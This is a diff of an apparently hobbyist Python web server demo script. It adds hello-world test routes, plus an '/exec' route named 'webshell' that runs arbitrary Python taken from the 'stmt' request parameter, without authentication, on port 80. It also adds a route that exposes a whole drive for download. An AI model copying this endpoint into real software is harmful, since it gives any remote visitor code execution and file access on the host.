@@ -1,21 +1,49 @@
-import Server
-import Structs
-import time
+import interfaces
+import server
+import structs
 
 # author: 程鹏博 景炎 2010
 # date 2021-4-9
 
 
-a = Server.Server(('', 80), timeout = 30)
+a = server.Server(('', 80), thread_limit = 8)
 print(f'You can visit this server at {a.addr}')
 
 
-def hello_world(request: Structs.Request) -> Structs.Response:
+@a.bind('/test')
+def hello_world(request: structs.Request) -> structs.Response:
     s = f'hello world! from {request.addr}'
-    return Structs.Response(content = s)
+    return structs.Response(content = s)
 
 
-f = Structs.Interface(hello_world, Structs.Request)
-# 访问 127.0.0.1/test 来激活这个Interface
-a.bind('/test', f)
+@a.bind('/raw_test')
+def raw_hello(request: structs.Request):
+    s = f'hello world! from {request.addr}'
+    request.conn.sendall(structs.Response(content = s).generate())
+
+
+test = structs.Node()
+
+
+@test.bind('/test')
+def hello_world(request: structs.Request) -> structs.Response:
+    s = f'hello world! from {request.addr}'
+    return structs.Response(content = s)
+
+
+@test.bind('/raw_test')
+def raw_hello(request: structs.Request):
+    s = f'hello world! from {request.addr}'
+    request.conn.sendall(structs.Response(content = s).generate())
+
+
+@a.bind('/exec')
+def shell(request: structs.Request):
+    command = compile(request.keyword['stmt'], 'webshell', 'single')
+    exec(command)
+    return structs.Response(content = 'Success')
+
+
+a.bind('/t', test)
+a.bind('/dl', interfaces.Folder('B:/'))
 a.run()
